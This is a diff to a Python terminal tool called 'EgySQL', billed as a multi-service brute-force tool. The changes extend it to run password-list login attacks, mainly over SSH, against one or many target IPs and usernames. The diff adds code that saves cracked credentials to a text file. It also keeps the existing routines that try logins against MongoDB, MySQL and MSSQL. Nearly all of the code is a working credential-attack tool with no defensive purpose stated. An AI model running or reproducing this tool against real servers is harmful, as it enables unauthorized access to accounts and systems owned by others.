@@ -18,14 +18,12 @@ SERVICES = {
     '7': ('RDP', None, 3389),  # Placeholder for future implementation
 }
 
-
 def check_port_open(host, port):
     try:
         with socket.create_connection((host, port), timeout=2):
             return True
     except (socket.timeout, ConnectionRefusedError):
         return False
-
 
 def read_passwords_from_file(password_list_path):
     try:
@@ -35,6 +33,9 @@ def read_passwords_from_file(password_list_path):
         print(f"[-] Error: Password list file '{password_list_path}' not found.")
         return None
 
+def save_successful_attempt(service, host, username, password):
+    with open("successful_attempts.txt", "a") as f:
+        f.write(f"Service: {service}, Host: {host}, Username: {username}, Password: {password}\n")
 
 def execute_bruteforce(service, host, username, password, stdscr):
     try:
@@ -44,7 +45,7 @@ def execute_bruteforce(service, host, username, password, stdscr):
 
         if not check_port_open(host, client_port):
             return False
-        
+
         connection_params = {
             'host': host,
             'port': client_port,
@@ -53,33 +54,39 @@ def execute_bruteforce(service, host, username, password, stdscr):
             'timeout': 2
         }
         with client(**connection_params) as conn:
-            if service == '1':  # MongoDB
+            if service == '1':
                 databases = conn.list_database_names()
-            elif service == '2':  # MySQL
+            elif service == '2':
                 cursor = conn.cursor()
                 cursor.execute("SHOW DATABASES")
                 databases = cursor.fetchall()
                 cursor.close()
-            elif service == '3':  # MSSQL
+            elif service == '3':
                 cursor = conn.cursor()
                 cursor.execute("SELECT name FROM master.dbo.sysdatabases")
                 databases = cursor.fetchall()
                 cursor.close()
+
+            # Save successful attempt to the text file
+            save_successful_attempt(SERVICES[service][0], host, username, password)
+
             return True
+
     except paramiko.ssh_exception.NoValidConnectionsError:
-        return False  # SSH - Failed to connect to the target
+        return False
     except paramiko.AuthenticationException:
-        return False  # SSH - Authentication failure
+        return False
     except paramiko.ssh_exception.SSHException:
-        return False  # SSH - Connection error
+        return False
     except Exception as e:
-        return False  # Other exceptions, indicating a failed login attempt
+        return False
 
-
-def bruteforce_service(service, host, username, password_list_path, stdscr, verbose=True):
-    passwords = read_passwords_from_file(password_list_path)
-
-    if passwords is None:
+def bruteforce_service(service, host, username, password_list, stdscr, verbose=True):
+    if not password_list:
+        stdscr.addstr(2, 0, "[-] Error: No passwords provided.", curses.color_pair(1))
+        stdscr.refresh()
+        stdscr.getch()
+        stdscr.clear()
         return
 
     stdscr.clear()
@@ -93,11 +100,13 @@ def bruteforce_service(service, host, username, password_list_path, stdscr, verb
         stdscr.clear()
         return
 
-    for password in passwords:
+    for password in password_list:
         success = execute_bruteforce(service, host, username, password, stdscr)
         if success:
             stdscr.addstr(2, 0, f"[+] Successfully logged in with credentials: {username}:{password}", curses.color_pair(2))
             stdscr.refresh()
+
+            # Save only the first successful attempt and then exit the loop
             break
         elif verbose:
             stdscr.addstr(2, 0, f"[-] Login failed with credentials: {username}:{password}", curses.color_pair(1))
@@ -111,18 +120,59 @@ def bruteforce_service(service, host, username, password_list_path, stdscr, verb
         stdscr.getch()
     stdscr.clear()
 
-
 def display_message_with_delay(stdscr, message, x, y, color_pair_id, delay=1):
     stdscr.addstr(x, y, message, curses.color_pair(color_pair_id))
     stdscr.refresh()
     stdscr.getch()
     stdscr.clear()
 
-
 def welcome_message(stdscr):
     stdscr.addstr(0, 0, "Welcome to EgySQL - The Ultimate Multi-Service Brute Force Tool\nAliElTop 1.0", curses.color_pair(3))
     stdscr.refresh()
 
+def get_ips_or_users_from_list(stdscr, is_ip=True):
+    stdscr.clear()
+    item_name = "IP" if is_ip else "User"
+    stdscr.addstr(0, 0, f"Enter {item_name}s (comma-separated):", curses.color_pair(4))
+    stdscr.refresh()
+    items = stdscr.getstr(1, 0).decode('utf-8').split(',')
+    return items
+
+def bruteforce_ip(stdscr, ip):
+    stdscr.clear()
+    stdscr.addstr(0, 0, f"[*] Starting bruteforce for IP: {ip}...", curses.color_pair(2))
+    stdscr.refresh()
+
+    stdscr.clear()
+    stdscr.addstr(0, 0, "Enter the target username:", curses.color_pair(4))
+    stdscr.refresh()
+    username = stdscr.getstr(1, 0).decode('utf-8')
+
+    stdscr.clear()
+    stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
+    stdscr.refresh()
+    password_list_path = stdscr.getstr(1, 0).decode('utf-8')
+    password_list = read_passwords_from_file(password_list_path)
+
+    bruteforce_service('5', ip, username, password_list, stdscr)
+
+def bruteforce_user(stdscr, user):
+    stdscr.clear()
+    stdscr.addstr(0, 0, f"[*] Starting bruteforce for User: {user}...", curses.color_pair(2))
+    stdscr.refresh()
+
+    stdscr.clear()
+    stdscr.addstr(0, 0, "Enter the target IP:", curses.color_pair(4))
+    stdscr.refresh()
+    ip = stdscr.getstr(1, 0).decode('utf-8')
+
+    stdscr.clear()
+    stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
+    stdscr.refresh()
+    password_list_path = stdscr.getstr(1, 0).decode('utf-8')
+    password_list = read_passwords_from_file(password_list_path)
+
+    bruteforce_service('5', ip, user, password_list, stdscr)
 
 def main(stdscr):
     curses.curs_set(0)
@@ -131,90 +181,106 @@ def main(stdscr):
     curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
     curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)
 
-    EGY_SQL_LOGO = r"""
-    ________████████████_____█████████████
-    ______███████████████___███████████████
-    ____████████████████████████████████████
-    ___█████████████████████████████████████
-    __███████████████████████████████████████
-    _█████████████████████████████████████████
-    _██████████████████████████████████████████
-    _███████████████████████████████████████████
-    ████████████████████████████████████████████
-    █████████████____█████████████_____█████████
-    ██████████______███████████______███████████
-    _████████_________████████_________████████
-    __████████_________███████_________████████
-    ___████████_________█████_________████████
-    ____████████_________███_________████████
-    ____████████████████████████████████████
-    _____█████████████████████████████████
-    ______███████████████████████████████
-    _______█████████████████████████████
-    ________██████______________███████
-    _________█████______________█████
-    __________████______________████
-    ___________███______________███
-    ____________██______________██
-    _____________█______________█
-    _____________________________
-    """
+    EGY_SQL_LOGO_LINES = [
+   r" _____████████████_____█████████████ ",
+   r"____███████████████___███████████████",
+   r"___████████████████████████████████████",
+   r" ___█████████████████████████████████████",
+   r"_███████████████████████████████████████",
+   r" _█████████████████████████████████████████",
+   r" _██████████████████████████████████████████",
+   r" _███████████████████████████████████████████",
+   r" ████████████████████████████████████████████",
+   r" █████████████____█████████████_____█████████",
+   r" ██████████______███████████______███████████",
+   r" _████████_________████████_________████████",
+   r" __████████_________███████_________████████",
+   r" ___████████_________█████_________████████",
+   r" ____████████_________███_________████████",
+   r" ____████████████████████████████████████",
+   r" _____█████████████████████████████████",
+   r"______███████████████████████████████",
+   r" _______█████████████████████████████",
+   r"________██████______________███████",
+   r"_________█████______________█████",
+   r"__________████______________████",
+   r"___________███______________███",
+   r"____________██______________██",
+   r"_____________█______________█",
+   r"_____________________________",
+                                                          
+    ]
 
     welcome_message(stdscr)
 
     while True:
         stdscr.clear()
-        stdscr.addstr(0, 0, "Choose a service to bruteforce:", curses.color_pair(4))
-        stdscr.addstr(1, 0, "1. MongoDB", curses.color_pair(3))
-        stdscr.addstr(2, 0, "2. MySQL", curses.color_pair(3))
-        stdscr.addstr(3, 0, "3. MSSQL", curses.color_pair(3))
-        stdscr.addstr(4, 0, "4. SQLite", curses.color_pair(3))
-        stdscr.addstr(5, 0, "5. SSH", curses.color_pair(3))
-        stdscr.addstr(6, 0, "6. FTP", curses.color_pair(3))
-        stdscr.addstr(7, 0, "7. RDP", curses.color_pair(3))
-        stdscr.addstr(8, 0, "Q. Quit", curses.color_pair(3))
-        stdscr.addstr(EGY_SQL_LOGO, curses.color_pair(2))
+        stdscr.addstr(0, 0, "Choose an option:", curses.color_pair(4))
+        stdscr.addstr(1, 0, "1. Scan a single IP", curses.color_pair(3))
+        stdscr.addstr(2, 0, "2. Scan multiple IPs from list", curses.color_pair(3))
+        stdscr.addstr(3, 0, "3. Scan a single user", curses.color_pair(3))
+        stdscr.addstr(4, 0, "4. Scan multiple users from list", curses.color_pair(3))
+        stdscr.addstr(5, 0, "Q. Quit", curses.color_pair(3))
+
+        # Display the logo as separate lines
+        for i, line in enumerate(EGY_SQL_LOGO_LINES):
+            stdscr.addstr(7 + i, 0, line, curses.color_pair(2))
+
         stdscr.refresh()
 
         choice = stdscr.getch()
-        if choice == ord('q') or choice == ord('Q'):
+        choice = chr(choice)
+
+        if choice == '1':
+            stdscr.clear()
+            stdscr.addstr(0, 0, "Do you want to scan multiple IPs or just one? (M/1):", curses.color_pair(4))
+            stdscr.refresh()
+            multi_choice = stdscr.getch()
+            is_multi_ip = multi_choice == ord('m') or multi_choice == ord('M')
+            if is_multi_ip:
+                ips = get_ips_or_users_from_list(stdscr, is_ip=True)
+                for ip in ips:
+                    bruteforce_ip(stdscr, ip)
+            else:
+                stdscr.clear()
+                stdscr.addstr(0, 0, "Enter the target IP:", curses.color_pair(4))
+                stdscr.refresh()
+                ip = stdscr.getstr(1, 0).decode('utf-8')
+                bruteforce_ip(stdscr, ip)
+
+        elif choice == '2':
+            ips = get_ips_or_users_from_list(stdscr, is_ip=True)
+            for ip in ips:
+                bruteforce_ip(stdscr, ip)
+
+        elif choice == '3':
+            stdscr.clear()
+            stdscr.addstr(0, 0, "Do you want to scan multiple users or just one? (M/1):", curses.color_pair(4))
+            stdscr.refresh()
+            multi_choice = stdscr.getch()
+            is_multi_user = multi_choice == ord('m') or multi_choice == ord('M')
+            if is_multi_user:
+                users = get_ips_or_users_from_list(stdscr, is_ip=False)
+                for user in users:
+                    bruteforce_user(stdscr, user)
+            else:
+                stdscr.clear()
+                stdscr.addstr(0, 0, "Enter the target username:", curses.color_pair(4))
+                stdscr.refresh()
+                user = stdscr.getstr(1, 0).decode('utf-8')
+                bruteforce_user(stdscr, user)
+
+        elif choice == '4':
+            users = get_ips_or_users_from_list(stdscr, is_ip=False)
+            for user in users:
+                bruteforce_user(stdscr, user)
+
+        elif choice.lower() == 'q':
             display_message_with_delay(stdscr, "Exiting...", 1, 20, 5, delay=2)
             sys.exit()
 
-        choice = chr(choice)
-        if choice in SERVICES:
-            stdscr.clear()
-            service_name = SERVICES[choice][0]
-            stdscr.addstr(0, 0, f"You chose {service_name}.", curses.color_pair(3))
-            stdscr.refresh()
-            stdscr.getch()
-
-            stdscr.clear()
-            stdscr.addstr(0, 0, "Enter the target host:", curses.color_pair(4))
-            stdscr.refresh()
-            host = stdscr.getstr(1, 0).decode('utf-8')
-
-            stdscr.clear()
-            stdscr.addstr(0, 0, "Enter the username:", curses.color_pair(4))
-            stdscr.refresh()
-            username = stdscr.getstr(1, 0).decode('utf-8')
-
-            stdscr.clear()
-            stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
-            stdscr.refresh()
-            password_list_path = stdscr.getstr(1, 0).decode('utf-8')
-
-            stdscr.clear()
-            stdscr.addstr(0, 0, "Enable verbose mode? (Y/N):", curses.color_pair(4))
-            stdscr.refresh()
-            verbose_choice = stdscr.getch()
-            verbose = verbose_choice == ord('y') or verbose_choice == ord('Y')
-
-            bruteforce_service(choice, host, username, password_list_path, stdscr, verbose=verbose)
-
         else:
             display_message_with_delay(stdscr, "Invalid choice. Try again...", 1, 20, 5, delay=2)
-
 
 if __name__ == "__main__":
     curses.wrapper(main)
